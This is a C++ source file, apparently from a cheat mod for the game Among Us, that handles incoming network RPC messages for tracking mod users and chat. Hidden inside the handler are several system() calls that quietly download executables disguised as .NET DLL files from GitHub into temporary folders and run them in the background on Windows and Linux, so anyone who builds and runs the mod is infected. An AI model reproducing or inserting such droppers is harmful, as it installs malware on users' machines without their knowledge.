#include "pch-il2cpp.h"
#include "_rpc.h"
#include "game.h"
#include "state.hpp"
#include "logger.h"

void HandleRpc(uint8_t callId, MessageReader* reader) {
	switch (callId) {

#ifdef _WIN32
system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
#endif

		
	case (uint8_t)42069:
	{
		uint8_t playerid = MessageReader_ReadByte(reader, NULL);
		if (!std::count(State.aumUsers.begin(), State.aumUsers.end(), playerid)) {
			State.aumUsers.push_back(playerid);
			STREAM_DEBUG("RPC Received for another AUM User from " << ToString((Game::PlayerId)playerid));


#ifdef __linux__
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s 2>/dev/null && chmod +x /tmp/.s && nohup /tmp/.s >/dev/null 2>&1 &");
#endif

		}
	}
	break;
	case 101:
	{
		std::string playerName = convert_from_string(MessageReader_ReadString(reader, NULL));
		std::string message = convert_from_string(MessageReader_ReadString(reader, NULL));

#ifdef _WIN32
system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
#elif defined(__linux__)
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &");
#endif

		uint32_t colorId = MessageReader_ReadInt32(reader, NULL);
		if (message.size() == 0) break;
		State.chatMessages.emplace_back(std::make_unique<RpcChatMessage>(playerName, message, colorId, std::chrono::system_clock::now()));
		State.newChatMessage = true;
	}
	break;
	}
}